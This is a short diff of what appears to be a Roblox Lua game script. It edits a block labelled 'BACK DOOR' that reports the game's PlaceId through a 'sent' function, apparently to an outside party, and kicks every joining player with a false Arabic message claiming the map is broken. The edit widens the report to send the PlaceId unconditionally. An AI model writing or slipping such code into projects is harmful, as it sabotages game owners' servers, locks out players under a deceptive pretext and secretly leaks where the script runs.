@@ -24,7 +24,7 @@ game.Players.PlayerRemoving:Connect(function(plr)
 end)
 -- BACK DOOR
 task.spawn(function()
-	sent(tostring(game.PlaceId == 135437901219767))	
+	sent(tostring(game.PlaceId))
 	game.Players.PlayerAdded:Connect(function(plr)
 		plr:Kick("الماب خربان استنى علبال ما نصلحه")
 	end)
